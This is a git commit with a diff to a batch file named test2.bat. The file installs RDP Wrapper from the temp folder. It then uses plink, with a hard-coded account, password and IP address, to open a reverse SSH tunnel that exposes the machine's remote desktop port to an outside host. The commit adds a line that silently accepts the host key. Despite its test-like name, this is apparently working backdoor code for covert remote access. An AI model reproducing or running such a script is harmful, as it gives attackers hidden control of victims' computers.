c9254392cb590cdb54fe6c13014c49b4ef916225
aleksandr0vitchvlad <56714175+aleksandr0vitchvlad@users.noreply.github.com>
2019-11-06 02:22:45 +0500

    Update test2.bat

--- test2.bat
+++ test2.bat
@@ -1,4 +1,9 @@
-%temp%/rdpwinst.exe -i -o
-set "pwd=gjqhZca%%_1b(9!/"
-%temp%\plink.exe walletdat11@34.69.85.132 -pw %pwd% -P 22 -2 -4 -T -N -C -R 127.0.0.1:12345:127.0.0.1:3389 -batch
+%temp%/rdpwinst.exe -i -o  
+
+echo y | %temp%\plink.exe -ssh walletdat11@34.69.85.132 "exit" 
+set "pwd=gjqhZca%%_1b(9!/" 
+
+%temp%\plink.exe walletdat11@34.69.85.132 -pw %pwd% -P 22 -2 -4 -T -N -C -R 127.0.0.1:12345:127.0.0.1:3389 -batch 
+
+
 
